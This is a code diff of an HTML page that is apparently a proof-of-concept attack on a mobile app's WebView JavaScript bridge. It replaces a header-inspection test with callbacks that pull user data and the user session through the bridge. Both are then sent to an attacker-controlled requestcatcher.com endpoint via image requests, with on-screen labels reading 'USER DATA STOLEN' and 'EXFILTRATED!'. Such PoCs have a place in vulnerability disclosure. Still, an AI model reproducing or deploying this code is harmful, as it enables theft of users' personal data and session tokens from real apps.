@@ -1,30 +1,23 @@
  <!DOCTYPE html>
   <html>
-  <head><title>Headers</title><meta charset="utf-8"></head>
+  <head><title>X</title><meta charset="utf-8"></head>
   <body style="background:#000;color:#0f0;font:10px monospace;padding:10px">
   <pre id="s">Loading...</pre>
   <script>
   var B = window.B612KajiBridgeInterface;
   var s = document.getElementById('s');
+  var ATTACKER = 'https://snowpoc.requestcatcher.com/';
 
   if (B) {
       s.textContent = 'Bridge OK\n\n';
 
-      window.headersCB = function(d) {
-          var x = typeof d === 'string' ? JSON.parse(d) : d;
-          s.textContent += '=== HEADERS SENT BY APP ===\n';
-          s.textContent += JSON.stringify(x, null, 2) + '\n';
-      };
-
-      B.apiRequest('headersCB', JSON.stringify({
-          url: 'https://httpbin.org/anything',
-          method: 'GET'
-      }));
-
       window.cb = function(d) {
           var x = typeof d === 'string' ? JSON.parse(d) : d;
-          s.textContent += '\n=== API RESPONSE ===\n';
-          s.textContent += JSON.stringify(x, null, 2) + '\n';
+          s.textContent += '=== USER DATA STOLEN ===\n';
+          s.textContent += JSON.stringify(x, null, 2) + '\n\n';
+          var img = new Image();
+          img.src = ATTACKER + 'userdata?d=' + encodeURIComponent(JSON.stringify(x));
+          s.textContent += 'EXFILTRATED!\n';
       };
 
       B.apiRequest('cb', JSON.stringify({
@@ -32,6 +25,12 @@
           method: 'POST'
       }));
 
+      window.cb2 = function(d) {
+          var x = typeof d === 'string' ? JSON.parse(d) : d;
+          var img = new Image();
+          img.src = ATTACKER + 'session?d=' + encodeURIComponent(JSON.stringify(x));
+      };
+      B.getUserSession('cb2');
   } else {
       s.textContent = 'No Bridge';
   }
